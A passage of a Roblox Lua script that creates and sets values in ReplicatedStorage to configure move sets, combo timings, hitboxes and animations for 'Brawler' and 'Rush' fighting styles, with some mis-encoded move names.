v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeLeft'
v.Name = ""EvadeStrikeL""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeR"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeRight'
v.Name = ""EvadeStrikeR""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""DashAttack"") then
v = game.ReplicatedStorage.Styles.Brawler[""DashAttack""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'RDashAttack'
v.Name = ""DashAttack""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Distanced"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Distanced""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FastFootworkBack'
v.Name = ""H_Distanced""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_TwoHandeds"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_TwoHandeds""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_SelfDestruct'
v.Name = ""H_TwoHandeds""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FullHeat"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FullHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_GUltimateEssence'
v.Name = ""H_FullHeat""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabStanding"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Fisticuffs'
v.Name = ""H_GrabStanding""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllRight"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllRight""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterRight'
v.Name = ""H_CounterSoloAllRight""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllLeft"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllLeft""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterLeft'
v.Name = ""H_CounterSoloAllLeft""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllFront"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllFront""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterFront'
v.Name = ""H_CounterSoloAllFront""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSoloAllBack"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSoloAllBack""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_TSpinCounterBack'
v.Name = ""H_CounterSoloAllBack""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabStanding2"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabStanding2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Swing'
v.Name = ""H_GrabStanding2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_RunningFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_RunningFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FinishingBlow'
v.Name = ""H_RunningFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_StandingBehind"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_StandingBehind""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_KnockOut'
v.Name = ""H_StandingBehind""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_SuperEvading"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_SuperEvading""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Rolling'
v.Name = ""H_SuperEvading""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Brawler[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'DragonTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Running4"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Running4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Terror'
v.Name = ""H_Running4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""HThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""HThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_FinishingHold2'
v.Name = ""HThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""LHThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""LHThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_BHeavyToss'
v.Name = ""LHThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenKick'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenStomp'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStandingHandgun"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStandingHandgun""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopperHandgun'
v.Name = ""H_GunStandingHandgun""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStanding"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopper'
v.Name = ""H_GunStanding""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Brawler[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Brawler)
end

v.AnimationId = ""rbxassetid://12120045620""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Brawler.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Brawler.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Moves.H_UltimateEssence:FindFirstChild(""MoveName"") then
v = game.ReplicatedStorage.Moves.H_UltimateEssence[""MoveName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_UltimateEssence)
end
v.Value = 'Ultimate Essence '
v.Name = ""MoveName""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Closest"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Closest""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '40'
v.Name = ""Closest""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Distance"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Distance""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '50'
v.Name = ""Distance""
if game.ReplicatedStorage.Moves.H_FastFootworkBack:FindFirstChild(""Within"") then
v = game.ReplicatedStorage.Moves.H_FastFootworkBack[""Within""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_FastFootworkBack)
end
v.Value = '15'
v.Name = ""Within""
                                                                                                                                                                                                                                                                                                                                                                                                                                                main.Heat.noheattho.Text = ""Heat Actions Disabled""
	                                                                                                                                                                                                                                                                                                                                                                                                                                            main.Heat.noheattho.Size = UDim2.new(10, 0, 1, 0)

	                                                                                                                                                                                                                                                                                                                                                                                                                                            menu.Bars.Mobile_Title.Visible = true

if game.ReplicatedStorage.Moves:FindFirstChild(""DragonTaunt"") then
v = game.ReplicatedStorage.Moves[""DragonTaunt""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves)
end
v.Name = ""DragonTaunt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Dmg"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Dmg""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0
v.Name = ""Dmg""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HitboxLocations"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HitboxLocations""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = '[[""RightHand"",3,[0,-1,0]],[""RightLowerArm"",1.5,[0,0,0]],[""RightUpperArm"",1,[0,0,0]]]'
v.Name = ""HitboxLocations""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""AniSpeed"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""AniSpeed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 1.225
v.Name = ""AniSpeed""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Sound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Sound""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 'Yell'
v.Name = ""Sound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""NoDmg"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""NoDmg""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""NoDmg""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HeatAt"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HeatAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.15
v.Name = ""HeatAt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""HeatGain"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""HeatGain""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 20
v.Name = ""HeatGain""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""ForceSound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""ForceSound""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""ForceSound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""TauntSound"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""TauntSound""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""TauntSound""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""EndAt"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""EndAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.8
v.Name = ""EndAt""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves.DragonTaunt)
end

v.AnimationId = ""rbxassetid://10928237540""
v.Name = ""Anim""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveForward"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveForward""]
else
v = Instance.new(""IntValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 2
v.Name = ""MoveForward""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveStart2"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveStart2""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 1.8
v.Name = ""MoveStart2""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""MoveDuration"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""MoveDuration""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Value = 0.4
v.Name = ""MoveDuration""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Dragon"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Dragon""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""Dragon""
if game.ReplicatedStorage.Moves.DragonTaunt:FindFirstChild(""Cancelable"") then
v = game.ReplicatedStorage.Moves.DragonTaunt[""Cancelable""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Moves.DragonTaunt)
end
v.Name = ""Cancelable""
if game.ReplicatedStorage.Moves[""ÈæçAttack1""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""ÈæçAttack1""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""ÈæçAttack1""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""ÈæçAttack2""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""ÈæçAttack2""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""ÈæçAttack2""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""ÈæçAttack3""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""ÈæçAttack3""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""ÈæçAttack3""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""ÈæçAttack4""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""ÈæçAttack4""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""ÈæçAttack4""])
end
v.Value = 0.2 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""ÈæçStrike5""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""ÈæçStrike5""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""ÈæçStrike5""])
end
v.Value = 0.5 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Moves[""BStrike5""]:FindFirstChild(""ComboAt"") then
v = game.ReplicatedStorage.Moves[""BStrike5""][""ComboAt""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""BStrike5""])
end
v.Value = 0.5 
v.Name = ""ComboAt""
if game.ReplicatedStorage.Styles:FindFirstChild(""Rush"") then
v = game.ReplicatedStorage.Styles[""Rush""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end
v.Name = ""Rush""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedF"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkFront'
v.Name = ""H_EvadedF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Stunning"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Stunning""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Reversal'
v.Name = ""H_Stunning""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""StartBlock"") then
v = game.ReplicatedStorage.Styles.Rush[""StartBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://10848090844""
v.Name = ""StartBlock""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Rush[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RushTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Rush[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 1.2
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Rush[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = Color3.fromRGB(254, 01, 154)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Rush[""RedHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Rush[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'Rush'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenStomp'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_BackWall"") then
v = game.ReplicatedStorage.Styles.Rush[""H_BackWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_CrushingWall'
v.Name = ""H_BackWall""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Rush[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RSweep'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_CounterSolo"") then
v = game.ReplicatedStorage.Styles.Rush[""H_CounterSolo""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FrenzySpinCounter'
v.Name = ""H_CounterSolo""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeStrikeF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeStrikeF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""EvadeStrikeF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Stunned"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Stunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FlyingKick'
v.Name = ""H_Stunned""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'ÈæçAttack2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'ÈæçAttack3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush4"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'ÈæçAttack1'
v.Name = ""Rush4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush5"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'ÈæçAttack2'
v.Name = ""Rush5""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush6"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush6""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'ÈæçAttack3'
v.Name = ""Rush6""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush7"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush7""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'ÈæçAttack1'
v.Name = ""Rush7""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush8"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush8""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'ÈæçAttack4'
v.Name = ""Rush8""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'Èæç2Strike1'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'ÈæçStrike5'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike5"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'BStrike5'
v.Name = ""Strike5""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike6"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike6""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'BStrike4'
v.Name = ""Strike6""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike7"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike7""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike4'
v.Name = ""Strike7""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike8"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike8""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike3'
v.Name = ""Strike8""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike9"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike9""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'Èæç2Strike4'
v.Name = ""Strike9""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'ÈæçAttack1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Running4"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Running4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Terror'
v.Name = ""H_Running4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_AirFallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_AirFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Whirl'
v.Name = ""H_AirFallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""GrabStrike"") then
v = game.ReplicatedStorage.Styles.Rush[""GrabStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'T_CounterQuickstep'
v.Name = ""GrabStrike""
if game.ReplicatedStorage.Styles.Rush.GrabStrike:FindFirstChild(""Ability"") then
v = game.ReplicatedStorage.Styles.Rush.GrabStrike[""Ability""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush.GrabStrike)
end
v.Value = 'Counter Quickstep'
v.Name = ""Ability""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Rush[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenKick'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedB"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkBack'
v.Name = ""H_EvadedB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710466763""
v.Name = ""EvadeF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710468004""
v.Name = ""EvadeL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710467557""
v.Name = ""EvadeR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710468479""
v.Name = ""EvadeB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710568545""
v.Name = ""EvadeCR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710568875""
v.Name = ""EvadeCL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632563534""
v.Name = ""EvadeQCB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

